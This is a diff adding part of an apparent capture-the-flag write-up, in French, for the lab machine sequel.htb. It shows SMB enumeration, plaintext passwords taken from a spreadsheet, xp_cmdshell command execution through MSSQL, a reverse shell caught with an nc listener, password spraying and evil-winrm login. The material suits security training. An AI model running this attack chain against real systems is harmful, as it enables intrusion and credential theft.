@@ -223,3 +223,141 @@ ADCS        10.10.11.51     389    DC01             Found PKI Enrollment Server:
 ADCS        10.10.11.51     389    DC01             Found CN: sequel-DC01-CA
 
 ```
+
+```
+nxc smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su' --shares
+```
+
+```
+nxc smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su' --shares 
+SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)                                                                                                                 
+SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
+SMB         10.10.11.51     445    DC01             [*] Enumerated shares
+SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
+SMB         10.10.11.51     445    DC01             -----           -----------     ------
+SMB         10.10.11.51     445    DC01             Accounting Department READ            
+SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
+SMB         10.10.11.51     445    DC01             C$                              Default share
+SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
+SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share 
+SMB         10.10.11.51     445    DC01             Users           READ            
+
+```
+
+```
+smbclient //10.10.11.51/Accounting\ Department -U rose
+
+Password for [WORKGROUP\rose]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sun Jun  9 06:52:21 2024
+  ..                                  D        0  Sun Jun  9 06:52:21 2024
+  accounting_2024.xlsx                A    10217  Sun Jun  9 06:14:49 2024
+  accounts.xlsx                       A     6780  Sun Jun  9 06:52:07 2024
+
+                6367231 blocks of size 4096. 927126 blocks available
+```
+
+```
+unzip accounts.xlsx 
+Archive:  accounts.xlsx
+file #1:  bad zipfile offset (local header sig):  0
+  inflating: xl/workbook.xml         
+  inflating: xl/theme/theme1.xml     
+  inflating: xl/styles.xml           
+  inflating: xl/worksheets/_rels/sheet1.xml.rels  
+  inflating: xl/worksheets/sheet1.xml  
+  inflating: xl/sharedStrings.xml    
+  inflating: _rels/.rels             
+  inflating: docProps/core.xml       
+  inflating: docProps/app.xml        
+  inflating: docProps/custom.xml     
+  inflating: [Content_Types].xml   
+```
+
+Contenu de xl/sharedStrings.xml :
+
+Angela Martin : angela@sequel.htb, angela, 0fwz7Q4mSpurIt99
+Oscar Martinez : oscar@sequel.htb, oscar, 86LxLBMgEWaKUnBG
+Kevin Malone : kevin@sequel.htb, kevin, Md9Wlq1E5bZnVDVo
+sa : sa@sequel.htb, MSSQLP@ssw0rd!
+
+```
+impacket-mssqlclient sa:'MSSQLP@ssw0rd!'@10.10.11.51 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (sa  dbo@master)> enable_xp_cmdshell
+INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (sa  dbo@master)> xp_cmdshell whoami
+output           
+--------------   
+sequel\sql_svc   
+
+NULL   
+```
+
+Creation de Reverse Shell PowerShell : https://github.com/Adkali/PowerJoker
+
+Une fois le reverse reçu:
+
+```
+rlwrap -cAR nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.10.14.64] from (UNKNOWN) [10.10.11.51] 64358
+
+JokerShell C:\Windows\system32>
+```
+
+```
+JokerShell C:\SQL2019\ExpressAdv_ENU> cat sql-Configuration.INI
+[OPTIONS]
+ACTION="Install"
+QUIET="True"
+FEATURES=SQL
+INSTANCENAME="SQLEXPRESS"
+INSTANCEID="SQLEXPRESS"
+RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
+AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
+AGTSVCSTARTUPTYPE="Manual"
+COMMFABRICPORT="0"
+COMMFABRICNETWORKLEVEL=""0"
+COMMFABRICENCRYPTION="0"
+MATRIXCMBRICKCOMMPORT="0"
+SQLSVCSTARTUPTYPE="Automatic"
+FILESTREAMLEVEL="0"
+ENABLERANU="False" 
+SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
+SQLSVCACCOUNT="SEQUEL\sql_svc"
+SQLSVCPASSWORD="WqSZAFzzzzzzzzzzz"
+SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
+SECURITYMODE="SQL"
+SAPWD="MSSQLP@ssw0rd!"
+ADDCURRENTUSERASSQLADMIN="False"
+TCPENABLED="1"
+NPENABLED="1"
+BROWSERSVCSTARTUPTYPE="Automatic"
+IAcceptSQLServerLicenseTerms=True
+```
+
+```
+nxc ldap 10.10.11.51 -u /usr/share/seclists/Usernames/Names/names.txt -p 'WqSZAFzzzzzzzzzzz' --continue-on-success
+```
+
+```
+evil-winrm -i 10.10.11.51 -u ryan -p 'WqSZAFzzzzzzzzzzz'
+```
+
+```
+*Evil-WinRM* PS C:\Users\ryan\Desktop> cat user.txt
+02f347d7c997dxxxxxxxxxxxxxxxx
+```
